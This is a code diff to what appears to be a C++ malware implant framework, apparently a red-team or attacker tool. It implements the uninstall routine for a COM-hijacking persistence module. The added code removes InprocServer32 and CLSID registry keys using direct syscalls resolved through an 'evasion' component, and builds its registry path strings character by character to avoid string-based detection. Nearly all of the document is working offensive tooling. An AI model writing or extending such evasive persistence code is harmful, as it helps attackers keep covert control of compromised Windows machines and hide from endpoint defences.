@@ -69,10 +69,46 @@ bool ComHijacker::Install(const std::string& implantPath, const std::string& cls
     return NT_SUCCESS(status);
 }
 
-bool ComHijacker::Uninstall(const std::string& /*clsid*/) {
-    // TODO: Implement the uninstall logic.
-    // Syscall for NtDeleteKey is more complex. Stubbing for now.
-    return true;
+bool ComHijacker::Uninstall(const std::string& clsid) {
+    evasion::SyscallResolver& res = evasion::SyscallResolver::GetInstance();
+    DWORD ntDeleteKeySsn = res.GetServiceNumber("NtDeleteKey");
+    DWORD ntOpenKeySsn = res.GetServiceNumber("NtOpenKey");
+    DWORD ntCloseSsn = res.GetServiceNumber("NtClose");
+    if (ntDeleteKeySsn == 0xFFFFFFFF) return false;
+
+    wchar_t softwareClassesClsid[] = { L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'C', L'l', L'a', L's', L's', L'e', L's', L'\\', L'C', L'L', L'S', L'I', L'D', L'\\', 0 };
+    std::wstring wClsid(clsid.begin(), clsid.end());
+    wchar_t inprocServer32[] = { L'\\', L'I', L'n', L'p', L'r', L'o', L'c', L'S', L'e', L'r', L'v', L'e', L'r', L'3', L'2', 0 };
+
+    std::wstring inprocPath = std::wstring(softwareClassesClsid) + wClsid + std::wstring(inprocServer32);
+    std::wstring clsidPath = std::wstring(softwareClassesClsid) + wClsid;
+
+    // Delete InprocServer32 subkey first
+    UNICODE_STRING keyUniInproc;
+    RtlInitUnicodeString(&keyUniInproc, (L"\\Registry\\User\\" + GetCurrentUserSid() + L"\\" + inprocPath).c_str());
+    OBJECT_ATTRIBUTES attrInproc;
+    InitializeObjectAttributes(&attrInproc, &keyUniInproc, 0, NULL, NULL);
+    HANDLE hKeyInproc;
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKeyInproc, KEY_ALL_ACCESS, &attrInproc);
+    if (NT_SUCCESS(status)) {
+        InternalDoSyscall(ntDeleteKeySsn, hKeyInproc);
+        InternalDoSyscall(ntCloseSsn, hKeyInproc);
+    }
+
+    // Delete CLSID key
+    UNICODE_STRING keyUniClsid;
+    RtlInitUnicodeString(&keyUniClsid, (L"\\Registry\\User\\" + GetCurrentUserSid() + L"\\" + clsidPath).c_str());
+    OBJECT_ATTRIBUTES attrClsid;
+    InitializeObjectAttributes(&attrClsid, &keyUniClsid, 0, NULL, NULL);
+    HANDLE hKeyClsid;
+    status = InternalDoSyscall(ntOpenKeySsn, &hKeyClsid, KEY_ALL_ACCESS, &attrClsid);
+    if (NT_SUCCESS(status)) {
+        InternalDoSyscall(ntDeleteKeySsn, hKeyClsid);
+        InternalDoSyscall(ntCloseSsn, hKeyClsid);
+        return true;
+    }
+
+    return false;
 }
 
 } // namespace persistence
